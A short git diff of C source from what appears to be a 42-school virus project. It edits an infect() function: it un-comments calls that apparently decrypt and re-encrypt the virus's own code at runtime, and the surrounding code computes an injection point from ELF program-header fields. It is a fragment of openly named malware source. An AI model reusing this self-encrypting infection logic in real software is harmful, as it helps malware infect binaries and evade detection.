@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 12:33:58 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 17:18:22 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,7 +17,8 @@
 */
 void		infect(t_data *data)
 {
-	/* revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
+
+	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 
 #ifdef DEBUG
 	char de[] = "infect\t\t0\n";
@@ -43,7 +44,6 @@ void		infect(t_data *data)
 
 	if (data->virus.note == NULL || data->virus.data == NULL)
 		goto next;
-
 	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
 	size_t padd = base % data->virus.data->p_align;
 
@@ -68,7 +68,9 @@ void		infect(t_data *data)
 	data->context = true;
 
 next:
-	/* update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
-	/* revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */
+
+	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
+	revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
+
 	inject(data);
 }
